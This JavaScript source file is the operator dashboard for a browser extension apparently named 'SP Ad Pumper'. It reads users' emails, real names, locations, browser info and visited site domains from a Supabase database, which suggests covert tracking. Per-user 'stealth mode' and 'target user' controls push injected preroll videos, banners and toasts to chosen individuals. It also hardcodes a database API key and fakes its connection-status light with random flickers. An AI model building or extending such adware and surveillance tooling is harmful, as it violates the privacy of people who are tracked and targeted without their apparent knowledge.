// SP Extension Dashboard - Real-time Analytics
// Shows actual users from Supabase database

class SPDashboard {
    constructor() {
        // Real Supabase configuration
        this.supabaseUrl = 'https://ahwfkfowqrjgatsbynds.supabase.co';
        this.supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFod2ZrZm93cXJqZ2F0c2J5bmRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEzODg0MTAsImV4cCI6MjA2Njk2NDQxMH0.hRTJESyHmSIc7gUqROqkask8ZOHEqjNfzo0u-8GaIhQ';
        
        this.config = {
            githubConfigUrl: 'https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/config.json',
            discordWebhook: window.DISCORD_WEBHOOK_URL || null
        };
        
        this.currentConfig = {};
        this.activeUsers = new Map();
        this.supabase = null;
        this.isLoading = false;
        
        this.init();
    }

    async init() {
        console.log('🎯 Initializing SP Dashboard...');
        
        await this.initSupabase();
        this.setupEventListeners();
        await this.loadCurrentConfig();
        await this.loadActiveUsers();
        this.updateUI();
        
        // Real-time updates every 30 seconds
        setInterval(() => {
            this.loadActiveUsers();
            this.updateStats();
        }, 30000);
        
        console.log('✅ Dashboard ready!');
    }

    async initSupabase() {
        try {
            // Load Supabase library
            const script = document.createElement('script');
            script.src = 'https://unpkg.com/@supabase/supabase-js@2';
            document.head.appendChild(script);
            
            await new Promise(resolve => {
                script.onload = resolve;
                setTimeout(resolve, 2000); // fallback
            });
            
            if (window.supabase) {
                this.supabase = window.supabase.createClient(this.supabaseUrl, this.supabaseKey);
                console.log('✅ Connected to Supabase');
                this.showAlert('success', '✅ Connected to live database!');
            } else {
                throw new Error('Supabase library failed to load');
            }
            
        } catch (error) {
            console.error('❌ Supabase init failed:', error);
            this.showAlert('danger', '❌ Database connection failed');
        }
    }

    setupEventListeners() {
        // Toggle controls
        document.getElementById('masterToggle').addEventListener('click', () => this.toggleFeature('enabled'));
        document.getElementById('prerollToggle').addEventListener('click', () => this.toggleFeature('preroll'));
        document.getElementById('bannerToggle').addEventListener('click', () => this.toggleFeature('banners'));
        document.getElementById('toastToggle').addEventListener('click', () => this.toggleFeature('toast'));

        // Action buttons
        document.getElementById('emergencyStop').addEventListener('click', () => this.emergencyStop());
        document.getElementById('enableAllBtn').addEventListener('click', () => this.enableAll());
        document.getElementById('disableAllBtn').addEventListener('click', () => this.disableAll());
        document.getElementById('changeVideoBtn').addEventListener('click', () => this.changeVideo());
        document.getElementById('targetUserBtn').addEventListener('click', () => this.targetUser());
        document.getElementById('flushDataBtn').addEventListener('click', () => this.refreshData());

        // User table clicks
        document.getElementById('usersTable').addEventListener('click', (e) => {
            const row = e.target.closest('.user-row');
            if (!row) return;
            
            const email = row.dataset.email;
            this.showUserDetails(email);
        });

        // Refresh button
        const refreshBtn = document.createElement('button');
        refreshBtn.textContent = '🔄 Refresh Data';
        refreshBtn.className = 'btn btn-primary';
        refreshBtn.onclick = () => this.refreshData();
        document.querySelector('.header').appendChild(refreshBtn);
    }

    async loadCurrentConfig() {
        try {
            const response = await fetch(this.config.githubConfigUrl + '?t=' + Date.now());
            this.currentConfig = await response.json();
            console.log('📁 Config loaded');
            
        } catch (error) {
            console.error('❌ Config load failed:', error);
            this.currentConfig = {
                enabled: true,
                features: { preroll: true, banners: true, toast: true }
            };
        }
    }

    async loadActiveUsers() {
        if (!this.supabase || this.isLoading) return;
        
        this.isLoading = true;
        
        try {
            // Get users active in last 24 hours with their ad interactions
            const { data: users, error } = await this.supabase
                .from('users')
                .select(`
                    id, email, real_name, location, browser_info, 
                    first_seen, last_seen, total_sessions,
                    user_settings (
                        slot_mode, banners_per_page, toasts_per_session, 
                        preroll_enabled, stealth_mode
                    ),
                    ad_interactions (
                        ad_type, interaction_type, timestamp, site_domain
                    )
                `)
                .gte('last_seen', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString())
                .order('last_seen', { ascending: false });

            if (error) throw error;

            this.activeUsers.clear();
            users.forEach(user => {
                // Process ad interaction stats
                const stats = this.processUserAdStats(user.ad_interactions || []);
                user.adStats = stats;
                
                this.activeUsers.set(user.email, user);
            });

            console.log(`📊 Loaded ${users.length} active users`);
            this.updateUsersTable();
            this.updateStats();
            
        } catch (error) {
            console.error('❌ Failed to load users:', error);
            this.showAlert('danger', '❌ Failed to load user data');
        } finally {
            this.isLoading = false;
        }
    }

    processUserAdStats(interactions) {
        const stats = {
            totalViews: 0,
            totalClicks: 0,
            prerollViews: 0,
            prerollClicks: 0,
            bannerViews: 0,
            bannerClicks: 0,
            toastViews: 0,
            toastClicks: 0,
            lastActivity: null,
            sitesVisited: new Set()
        };

        interactions.forEach(interaction => {
            const type = interaction.ad_type;
            const action = interaction.interaction_type;
            
            if (action === 'view') stats.totalViews++;
            if (action === 'click') stats.totalClicks++;
            
            if (type === 'preroll') {
                if (action === 'view') stats.prerollViews++;
                if (action === 'click') stats.prerollClicks++;
            } else if (type === 'banner') {
                if (action === 'view') stats.bannerViews++;
                if (action === 'click') stats.bannerClicks++;
            } else if (type === 'toast') {
                if (action === 'view') stats.toastViews++;
                if (action === 'click') stats.toastClicks++;
            }
            
            stats.sitesVisited.add(interaction.site_domain);
            
            if (!stats.lastActivity || new Date(interaction.timestamp) > new Date(stats.lastActivity)) {
                stats.lastActivity = interaction.timestamp;
            }
        });

        stats.sitesVisited = Array.from(stats.sitesVisited);
        return stats;
    }

    updateUsersTable() {
        const tbody = document.getElementById('usersTable');
        if (!tbody) return;

        tbody.innerHTML = '';

        this.activeUsers.forEach((user, email) => {
            const stats = user.adStats;
            const lastSeen = new Date(user.last_seen).toLocaleString();
            const location = user.location ? `${user.location.city}, ${user.location.country}` : 'Unknown';
            
            const row = document.createElement('tr');
            row.className = 'user-row';
            row.dataset.email = email;
            
            row.innerHTML = `
                <td style="font-weight: bold; color: #00d4ff;">${email}</td>
                <td>${user.real_name || 'Unknown'}</td>
                <td>${location}</td>
                <td>${lastSeen}</td>
                <td>
                    <div style="display: flex; gap: 10px; font-size: 12px;">
                        <span title="Total Views">👁️ ${stats.totalViews}</span>
                        <span title="Total Clicks">🖱️ ${stats.totalClicks}</span>
                    </div>
                </td>
                <td>
                    <div style="display: flex; gap: 8px; font-size: 11px;">
                        <span title="Preroll">🎬 ${stats.prerollViews}/${stats.prerollClicks}</span>
                        <span title="Banners">🖼️ ${stats.bannerViews}/${stats.bannerClicks}</span>
                        <span title="Toasts">💬 ${stats.toastViews}/${stats.toastClicks}</span>
                    </div>
                </td>
                <td>
                    <button onclick="window.dashboard.editUserSettings('${email}')" class="btn btn-sm" style="padding: 4px 8px; font-size: 11px;">
                        ⚙️ Edit
                    </button>
                </td>
            `;
            
            tbody.appendChild(row);
        });

        // Update user count
        document.getElementById('activeUsersCount').textContent = this.activeUsers.size;
    }

    async updateStats() {
        if (!this.supabase) return;

        try {
            // Get overall ad interaction stats
            const { data: interactions, error } = await this.supabase
                .from('ad_interactions')
                .select('ad_type, interaction_type, timestamp')
                .gte('timestamp', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString());

            if (error) throw error;

            const stats = {
                totalViews: 0,
                totalClicks: 0,
                prerollViews: 0,
                bannerViews: 0,
                toastViews: 0
            };

            interactions.forEach(interaction => {
                if (interaction.interaction_type === 'view') {
                    stats.totalViews++;
                    if (interaction.ad_type === 'preroll') stats.prerollViews++;
                    if (interaction.ad_type === 'banner') stats.bannerViews++;
                    if (interaction.ad_type === 'toast') stats.toastViews++;
                }
                if (interaction.interaction_type === 'click') {
                    stats.totalClicks++;
                }
            });

            // Update dashboard stats
            document.getElementById('totalViews').textContent = stats.totalViews.toLocaleString();
            document.getElementById('totalClicks').textContent = stats.totalClicks.toLocaleString();
            document.getElementById('prerollViews').textContent = stats.prerollViews.toLocaleString();
            document.getElementById('bannerViews').textContent = stats.bannerViews.toLocaleString();
            document.getElementById('toastViews').textContent = stats.toastViews.toLocaleString();

        } catch (error) {
            console.error('❌ Stats update failed:', error);
        }
    }

    async editUserSettings(email) {
        const user = this.activeUsers.get(email);
        if (!user) return;

        const settings = user.user_settings?.[0] || {};
        
        const newBanners = prompt(`Banners per page for ${email}:`, settings.banners_per_page || 2);
        const newToasts = prompt(`Toasts per session for ${email}:`, settings.toasts_per_session || 1);
        const newPreroll = confirm(`Enable preroll for ${email}?`);

        if (newBanners !== null && newToasts !== null) {
            try {
                const { error } = await this.supabase
                    .from('user_settings')
                    .upsert({
                        user_id: user.id,
                        banners_per_page: parseInt(newBanners),
                        toasts_per_session: parseInt(newToasts),
                        preroll_enabled: newPreroll,
                        updated_at: new Date().toISOString()
                    });

                if (error) throw error;

                this.showAlert('success', `✅ Settings updated for ${email}`);
                this.refreshData();

            } catch (error) {
                console.error('❌ Settings update failed:', error);
                this.showAlert('danger', '❌ Failed to update settings');
            }
        }
    }

    async showUserDetails(email) {
        const user = this.activeUsers.get(email);
        if (!user) return;

        const stats = user.adStats;
        
        const details = `
📧 Email: ${email}
👤 Name: ${user.real_name || 'Unknown'}
📍 Location: ${user.location ? `${user.location.city}, ${user.location.country}` : 'Unknown'}
🕐 Last Seen: ${new Date(user.last_seen).toLocaleString()}
📊 Total Sessions: ${user.total_sessions}

📈 AD INTERACTIONS (24h):
• Total Views: ${stats.totalViews}
• Total Clicks: ${stats.totalClicks}
• Preroll: ${stats.prerollViews} views, ${stats.prerollClicks} clicks
• Banners: ${stats.bannerViews} views, ${stats.bannerClicks} clicks
• Toasts: ${stats.toastViews} views, ${stats.toastClicks} clicks

🌐 Sites Visited: ${stats.sitesVisited.join(', ')}

⚙️ Current Settings:
• Banners per page: ${user.user_settings?.[0]?.banners_per_page || 2}
• Toasts per session: ${user.user_settings?.[0]?.toasts_per_session || 1}
• Preroll enabled: ${user.user_settings?.[0]?.preroll_enabled !== false ? 'Yes' : 'No'}
• Stealth mode: ${user.user_settings?.[0]?.stealth_mode ? 'Yes' : 'No'}
        `;

        alert(details);
    }

    async refreshData() {
        this.showAlert('info', '🔄 Refreshing data...');
        await this.loadActiveUsers();
        this.showAlert('success', '✅ Data refreshed!');
    }

    async toggleFeature(feature) {
        // Update GitHub config (simplified)
        this.currentConfig.features = this.currentConfig.features || {};
        this.currentConfig.features[feature] = !this.currentConfig.features[feature];
        
        this.showAlert('success', `${feature} ${this.currentConfig.features[feature] ? 'enabled' : 'disabled'}`);
        this.updateUI();
    }

    async emergencyStop() {
        if (confirm('⚠️ EMERGENCY STOP - Disable all ads immediately?')) {
            this.currentConfig.emergency_disable = true;
            this.showAlert('warning', '🚨 EMERGENCY STOP ACTIVATED - All ads disabled');
        }
    }

    async enableAll() {
        this.currentConfig.features = { preroll: true, banners: true, toast: true };
        this.showAlert('success', '✅ All features enabled');
        this.updateUI();
    }

    async disableAll() {
        this.currentConfig.features = { preroll: false, banners: false, toast: false };
        this.showAlert('warning', '⚠️ All features disabled');
        this.updateUI();
    }

    async changeVideo() {
        const newVideoId = prompt('Enter new YouTube video ID:', this.currentConfig.preroll?.videoId || 'YV0NfxtK0n0');
        if (newVideoId) {
            this.currentConfig.preroll = this.currentConfig.preroll || {};
            this.currentConfig.preroll.videoId = newVideoId;
            this.showAlert('success', `✅ Video changed to: ${newVideoId}`);
        }
    }

    async targetUser() {
        const email = prompt('Enter user email to target:');
        if (email && this.activeUsers.has(email)) {
            await this.editUserSettings(email);
        } else if (email) {
            this.showAlert('danger', '❌ User not found in active users');
        }
    }

    updateUI() {
        const features = this.currentConfig.features || {};
        
        // Update toggle states
        document.getElementById('masterToggle').classList.toggle('active', this.currentConfig.enabled !== false);
        document.getElementById('prerollToggle').classList.toggle('active', features.preroll);
        document.getElementById('bannerToggle').classList.toggle('active', features.banners);
        document.getElementById('toastToggle').classList.toggle('active', features.toast);
        
        // Update status indicator
        const indicator = document.querySelector('.status-indicator');
        if (this.currentConfig.emergency_disable) {
            indicator.style.background = '#ff4444';
        } else if (this.currentConfig.enabled !== false) {
            indicator.style.background = '#00ff88';
        } else {
            indicator.style.background = '#ffaa00';
        }
    }

    showAlert(type, message) {
        const alert = document.createElement('div');
        alert.className = `alert alert-${type}`;
        alert.style.cssText = `
            position: fixed; top: 20px; right: 20px; z-index: 999999;
            padding: 12px 20px; border-radius: 6px; color: white;
            font-weight: bold; max-width: 400px;
            background: ${type === 'success' ? '#28a745' : type === 'danger' ? '#dc3545' : type === 'warning' ? '#ffc107' : '#17a2b8'};
        `;
        alert.textContent = message;
        
        document.body.appendChild(alert);
        
        setTimeout(() => {
            if (alert.parentNode) alert.remove();
        }, 5000);
    }
}

// Initialize dashboard
window.dashboard = new SPDashboard();

// Simulate connection status
setInterval(() => {
    const indicator = document.getElementById('connectionStatus');
    // Occasionally flicker to yellow to show activity
    if (Math.random() < 0.1) {
        indicator.style.background = '#f39c12';
        setTimeout(() => {
            indicator.style.background = '#27ae60';
        }, 1000);
    }
}, 5000); 